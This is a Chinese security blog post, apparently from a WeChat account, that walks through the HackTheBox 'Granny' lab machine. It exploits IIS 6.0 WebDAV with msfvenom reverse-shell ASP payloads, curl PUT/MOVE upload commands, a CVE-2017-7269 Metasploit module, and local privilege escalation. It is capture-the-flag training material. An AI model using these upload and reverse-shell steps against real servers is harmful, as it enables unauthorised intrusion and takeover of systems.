> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/WVAfWxe5SOFo2FIQ_DGzsg)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **58** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/2ichQqW6XvPlgohk6kjVu8GYOQ2Oco557j1bibkVCOsbLrO28pO7Lws1oVXcvS90GtYFe9Va2cepbqXjuziaDrnibg/640?wx_fmt=png)

靶机地址：https://www.hackthebox.eu/home/machines/profile/14

靶机难度：容易（3.0/10）

靶机发布日期：2017 年 10 月 12 日

靶机描述：

Granny, while similar to Grandpa, can be exploited using several different methods. The intended method of solving this machine is the widely-known Webdav upload vulnerability.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/70aCp38I3nX6dfnC3RPrQfDeuwyvRCkVZ5NrvqgrPsUd76ALjnYzdoWubzsdbaGpIBU9LdWWaN6eK2jaDkibicFA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_svg/jRoggJ2RF3BHibojhJQ8jmNderYtvTh8HkyBLp8nlK1B262IP84ZEic7el5hZ1rSy2RRjsGUQxdSGiaPFGG66pA8FnblLMZNWzA/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_svg/jJSbu4Te5ib8dv7tckM3eiau36jYD6r6JzUadPhLfh5pBPkc7MXuibrLRyxucMXeHZMwuc8YJbmickBgMbiaNAGWJ6u8K69OmxYXp/640?wx_fmt=svg)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_svg/Iic9WLWEQMg188DeVtNKRm1TKjRbm9lMO1Sn0Nxp4ub3M6m1ib29Pg42QpAsl2KtUhGicZIM8mBLAW0BTviaOLUdwnDUBNpqgNlQ/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_svg/Ib5852jAyb9xjIOSr4AGdwHrOa5leGNTnFwkWXvaOsQMx7bVxQiabjjSeicggObSK25jW1K5mG6aNZia8VJuiaarScZkKOYlJP4a/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOmVE985UqLaMLjRhPdWkiaUPXibzfrt8eAF3YCCYqKialR1mY00yccjbRGUGMhEYC6o6iaJfvr9HEarA/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.15，windows 系统的靶机...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOmVE985UqLaMLjRhPdWkiaUaHiaDOAibCHQyVyicxQobqMEFOoIyYoLDGUUEcpDdbeImYbsjD62G8F0A/640?wx_fmt=png)

```
1.nmap扫描发现只开了80端口，版本是：Microsoft IIS version 6.0...
2.还启用了http-webdav...
3.还是Windows Server 2003系统...但是不清楚是32还是64位的....
```

由于我在准备 oscp 考试，尽量少用 MSF 内核提权...

访问 80web 页面：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOmVE985UqLaMLjRhPdWkiaUxYFsmuUNpGq4zrGy8m3uUVytCc76JjZSl32Z7ePQeLQBXJDOWOgdxw/640?wx_fmt=png)

可以看到该页面站点还在建设中，还在开发中...

![](https://mmbiz.qpic.cn/mmbiz_svg/jRoggJ2RF3BHibojhJQ8jmNderYtvTh8HkyBLp8nlK1B262IP84ZEic7el5hZ1rSy2RRjsGUQxdSGiaPFGG66pA8FnblLMZNWzA/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_svg/jJSbu4Te5ib8dv7tckM3eiau36jYD6r6JzUadPhLfh5pBPkc7MXuibrLRyxucMXeHZMwuc8YJbmickBgMbiaNAGWJ6u8K69OmxYXp/640?wx_fmt=svg)

二、提权

![](https://mmbiz.qpic.cn/mmbiz_svg/Iic9WLWEQMg188DeVtNKRm1TKjRbm9lMO1Sn0Nxp4ub3M6m1ib29Pg42QpAsl2KtUhGicZIM8mBLAW0BTviaOLUdwnDUBNpqgNlQ/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_svg/Ib5852jAyb9xjIOSr4AGdwHrOa5leGNTnFwkWXvaOsQMx7bVxQiabjjSeicggObSK25jW1K5mG6aNZia8VJuiaarScZkKOYlJP4a/640?wx_fmt=svg)

  

  

方法 1：

  

  

通过前面获取的信息，这里可以利用 Webdav 信息进行提权... 

```
[webdav学习](https://ru.wikipedia.org/wiki/WebDAV#%D0%9C%D0%B5%D1%82%D0%BE%D0%B4%D1%8B)
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOmVE985UqLaMLjRhPdWkiaUVxlbLgblGWT8GUwhT9aMZJSG5GlZDY5jECEGicfy0A83IeSWRkvqBxg/640?wx_fmt=png)

```
curl -I 10.10.10.15
```

可以看到标头正在使用 ASP.NET...

基本的 Web 开发网站的堆栈结构如下：

```
LAMP = Linux + Apache + MySQL + PHP
WISA = Windows + IIS + SQL Server + ASP.NET
```

我进行的靶机是 woindows 环境，所以可以利用 ASP.NET 来替代 PHP，这里只需要找到一种方法来将文件以 asp/aspx 扩展名传递到服务器提权即可...（就是将合法文件上传到 Web 服务器，然后将其重命名为可执行文件，将扩展名更改为 asp 或 aspx）

我来验证下我的思路是不是对的...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOmVE985UqLaMLjRhPdWkiaUxib4chvVCJrcxORFoEnZibb2Py3QvaH31x1n9rXBDFc9PJvnyJe80qHQ/640?wx_fmt=png)

```
davtest --url http://10.10.10.15
```

Davtest 解释：WebDAV 是基于 Web 服务的扩展服务。它允许用户像操作本地文件一样，操作服务器上的文件。借助该功能，用户很方便的在网络上存储自己的文件。为了方便用户使用，通常会提供给用户较大的文件权限，如上传、修改甚至是执行权限。Kali Linux 提供了一款 WebDAV 服务漏洞利用工具 DAVTest。该工具会自动检测权限，寻找可执行文件的权限。一旦发现，用户就可以上传内置的后门工具，对服务器进行控制。同时，该工具可以上传用户指定的文件，便于后期利用。  （理解即可）

可以看到文本文件是成功上传加载的....OK，开始利用！！！

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOmVE985UqLaMLjRhPdWkiaUbKt4gESwJSfy5tK0locKcVZbAnQRLyzyEMYPdh1XApgiclZRY0oiceiag/640?wx_fmt=png)

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.16 LPORT=4443 -f asp > dayu1.asp
```

利用 msfvenom 生成 asp shell，然后上传到 Web 服务器即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOmVE985UqLaMLjRhPdWkiaUfAo0h9gx5e5s8b3AdHWiaUzLR1BPk6LlFjIiazcKHed4GkqSoYwrjJPA/640?wx_fmt=png)

将 asp 内容复制到 txt 文本中...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOmVE985UqLaMLjRhPdWkiaUjZHm4un02Oqwakk7cW7bXiaZal4qnqDsslB5lGfBhEkukAcwuvZvtHA/640?wx_fmt=png)

```
cadaver  http://10.10.10.15
```

cadaver 描述：WEBDAV 是基于 HTTP 1.1 的扩展协议，其支持使用 PUT 方法上传和锁定文件，基于这个特性可以实现功能强大的内容或配置管理系统。但丰富的功能特性总是会带来安全方面的更多隐患，尤其是在配置不当的情况下，可能直接给攻击者留下一个文件上传的入口。davtest 是一个文件上传漏洞的检测和验证工具，而 cadaver 作为一个命令行形式的 WEBDAV 客户端程序，可以对相应服务器进行任何操作。

可以看到通过 put 上传文件，然后 move 重名了文件... 即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOmVE985UqLaMLjRhPdWkiaUOsHuzsVtk7efUDibAibDVqib9icQND1mnhhhquqAKmzPGibScBG4lJxrh9Q/640?wx_fmt=png)

直接访问即可获得反向外壳....

  

  

方法 2：

  

  

利用 curl 上传...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOmVE985UqLaMLjRhPdWkiaUCSYukVib0yr3KCXpNfcDBs3yKdHLP3Z2OrAQgHsIWG9PC1g1lbtfhHQ/640?wx_fmt=png)

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.16 LPORT=4444 -f asp > dayu.asp
```

已经生成 dayu.asp...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOmVE985UqLaMLjRhPdWkiaUkzlwVw1iaXhOkAWPuA38pRXmHWy0wsdTib6llJHZ74VCBJZQkWbpqdJw/640?wx_fmt=png)

命令：

```
php
touch dayu.txt    --创建本地txt文件，用于替换asp创建的
cp dayu.asp dayu.txt   --将msfvenom生成的asp内容复制到txt文件中
curl -T 'dayu.txt' http://10.10.10.15/dayu.txt   --上传txt文件到granny服务上
curl -X MOVE --header 'Destination:http://10.10.10.15/dayu.asp' 'http://10.10.10.15/dayu.txt'   --txt改名asp
curl 'http://10.10.10.15/dayu.asp'   ---访问asp文件
```

可以看到成功获得反向外壳... 

```
[参考链接](https://code.blogs.iiidefix.net/posts/webdav-with-curl/)
```

  

  

方法 3：

  

  

通过前面 nmap 获得的信息，系统版本是：Microsoft IIS version 6.0，并且启用了 webdav...

这里利用 MSF 查看下可以利用哪些漏洞...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOmVE985UqLaMLjRhPdWkiaU3zCvVRwhq2H7G53lLdT7sEIfEs5ZvpY2aInLiaG6oicscCH5pjYPto1Q/640?wx_fmt=png)

可以看到这里存在 20 多个漏洞可利用，不是每个漏洞可以利用的...

```
1.通过版本6.0，可以知道exploit/windows/iis/iis_webdav_scstoragepathfromurl可以利用...这是CVE-2017-7269...
2.通过版本还可以知道IIS的应该都可以利用：exploit/windows/iis/iis_webdav_upload_asp
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOmVE985UqLaMLjRhPdWkiaUZfmia0x0my5OuOnzR3c0MWUq2yRAC5rYa6kKnTUFBMfF0vuhjiaruicpg/640?wx_fmt=png)

这里我就不展示很多个漏洞利用了，方法都一样...

  

  

获得 root.txt

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOmVE985UqLaMLjRhPdWkiaUtP5vQpTtsYBqJ2T2IeXM6Id0jOVyKicC7gVtWudzTKDH2P1fwWyjnFg/640?wx_fmt=png)

这里可以看到准确的版本....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOmVE985UqLaMLjRhPdWkiaU1ia33Qu9Z3sY6oo6Gqgudicemkhv5UwsibYIkBYETNmOCL9wbYdBIXKtQ/640?wx_fmt=png)

我这里利用 use post/multi/recon/local_exploit_suggester，这个是 Metasploit 中使用本地漏洞利用检查来检查系统是否存在本地漏洞...

就和漏扫脚本差不多... 很好的一个脚本...

这里发现了 7 个成功率高的漏洞，都是可以成功的... 利用就行...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOmVE985UqLaMLjRhPdWkiaUH3eeJiaVQNpxCWAAw6iaiaqLsmsX7NSFWPRqvZgHDAibqRCyiaWqWibfYRBg/640?wx_fmt=png)

可以看到直接利用不成功，需要注入一个进程进行提权...

这里利用 post/windows/manage/migrate 将 meterpreter 进程 rundll32.exe 中....

或者：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOmVE985UqLaMLjRhPdWkiaUHjmUJBsbYcic2ibJL3afokQZexSgxqaTpYph2eRwMbCmpH9h4fDJ7LFA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOmVE985UqLaMLjRhPdWkiaUN1ibC0PJicPbecLpWNtg0mdW9NcE2Cia2cysuRv1gpJIIF1EFwL2a74GQ/640?wx_fmt=png)

或者 PS 查看当前的进程... 然后 migrate 利用 PID 即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOmVE985UqLaMLjRhPdWkiaUxOSKscZmtBAnpEkOseZukCPiac1CLE59Q2WsKpzWZV95c9u1C3VGz5A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOmVE985UqLaMLjRhPdWkiaUjVGvVSvou5pnYEx0zxfkzHCV5VSM49bfNRpADmuMxpJ7JyI1M9KpUg/640?wx_fmt=png)

成功获得 user.txt 和 root.txt...

![](https://mmbiz.qpic.cn/mmbiz_png/2ichQqW6XvPlgohk6kjVu8GYOQ2Oco557j1bibkVCOsbLrO28pO7Lws1oVXcvS90GtYFe9Va2cepbqXjuziaDrnibg/640?wx_fmt=png)

这里我后面提权用了 MSF 进行的，很便捷，在 oscp 考试中虽然不能用，但是我可以通过脚本去识别对方存在哪些漏洞可执行...

还有不适用 MSF 的方法，直接通过脚本上传到靶机，然后通过脚本进行提权... 可以利用 smbserver.py 开启共享进行上传，然后通过漏洞，这里自己搜索 github，方法也有很多... 我就不写出来了，加油！！！

由于我们已经成功得到 root 权限查看 user.txt 和 root.txt，因此完成了简单靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/70aCp38I3nX6dfnC3RPrQfDeuwyvRCkVZ5NrvqgrPsUd76ALjnYzdoWubzsdbaGpIBU9LdWWaN6eK2jaDkibicFA/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)